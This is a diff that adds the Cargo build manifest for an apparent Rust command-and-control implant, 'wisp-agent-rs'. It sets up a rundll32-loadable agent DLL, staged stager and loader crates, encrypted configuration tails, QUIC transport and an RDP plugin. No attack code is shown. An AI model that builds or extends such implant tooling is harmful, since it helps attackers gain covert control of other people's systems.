@@ -1,0 +1,78 @@
+[package]
+name = "wisp-agent-rs"
+version = "0.3.0"
+edition = "2021"
+description = "WISP++ Rust implant — Type1/Type2 parity agent (lib + standalone bin)"
+
+[dependencies]
+ureq = { version = "2", default-features = false, features = ["native-tls"] }
+native-tls = "0.2"
+serde = { version = "1", features = ["derive"] }
+serde_json = "1"
+rsa = { version = "0.9", features = ["pem"] }
+aes = "0.8"
+ctr = "0.9"
+hmac = "0.12"
+sha2 = "0.10"
+rand = "0.8"
+base64 = "0.22"
+hex = "0.4"
+encoding_rs = "0.8"
+percent-encoding = "2"
+ed25519-dalek = { version = "2", default-features = false, features = ["fast"] }
+ruzstd = "0.9"
+quinn = { version = "0.11", default-features = false, features = ["rustls-ring", "runtime-tokio"], optional = true }
+tokio = { version = "1", default-features = false, features = ["rt", "net", "time", "io-util"], optional = true }
+rustls = { version = "0.23", default-features = false, features = ["ring", "std"], optional = true }
+
+[target.'cfg(windows)'.dependencies]
+wisp-map = { path = "staged/map" }
+windows-sys = { version = "0.61", features = [
+  "Win32_Foundation",
+  "Win32_Security",
+  "Win32_System_Console",
+  "Win32_System_Pipes",
+  "Win32_System_Threading",
+] }
+
+[target.'cfg(target_os = "linux")'.dependencies]
+libc = "0.2"
+
+[features]
+default = ["embedded-slot"]
+# Compiles the WISPCFG sentinel slot into the artifact. The staged core cdylib
+# disables this: its config arrives via an encrypted tail, never via the image.
+embedded-slot = []
+# QUIC transport (plan P6): quinn + rustls, dial-per-exchange Type1. Payload
+# templates enable it; default/source builds stay lean (plan decision #7).
+quic = ["dep:quinn", "dep:tokio", "dep:rustls"]
+
+[dev-dependencies]
+rcgen = "0.13"
+
+[profile.release]
+strip = true
+lto = true
+codegen-units = 1
+
+[lib]
+name = "wisp_agent_rs"
+path = "src/lib.rs"
+# cdylib is the rundll32-loadable agent DLL; rlib is what the staged crates link.
+crate-type = ["rlib", "cdylib"]
+
+[[bin]]
+name = "wisp-agent-rs"
+path = "src/main.rs"
+
+[workspace]
+members = [
+    ".",
+    "staged/common",
+    "staged/map",
+    "staged/stager",
+    "staged/loader",
+    "staged/core",
+    "plugins/hello-native",
+    "plugins/rdp-windows",
+]
